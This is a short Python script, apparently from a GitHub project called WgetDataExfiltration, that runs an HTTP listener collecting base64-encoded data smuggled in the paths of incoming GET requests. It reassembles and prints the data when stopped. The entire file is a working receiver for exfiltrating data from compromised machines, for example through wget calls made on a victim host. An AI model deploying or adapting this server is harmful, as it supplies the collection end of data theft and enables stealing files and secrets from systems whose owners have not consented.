from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import sys
import base64

stream = b' '

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        global stream
        try:
        	stream+=base64.b64decode(bytes(repr(self.path).replace('/', '').replace('\'', '').encode("utf-8")))
        except:
        	print("")


if __name__ == "__main__":
	banner = """
=========================================================
*	WgetDumper Server				*
*	Coded by: SidHawks				*
*							*
*  https://github.com/sidhawkss/WgetDataExfiltration	*
=========================================================
	"""
	try:
		ip = "0.0.0.0"
		port = int(sys.argv[1])
		Server = HTTPServer((ip,port), Server)
		print(banner)
		print(" [!]Server running on http://%s:%s\n CTRL+C to stop the server and show the dump." % (ip, port))
		try:
			Server.serve_forever()
		except KeyboardInterrupt:
			Server.server_close()
			stream = stream.decode("ISO-8859-1")
			print("\n\n\n"+stream)
			exit(0)
	except:
		print(banner)
		print(" [!]Please provide the port to listen in your host:\n  $python DumpServer.py 8080")
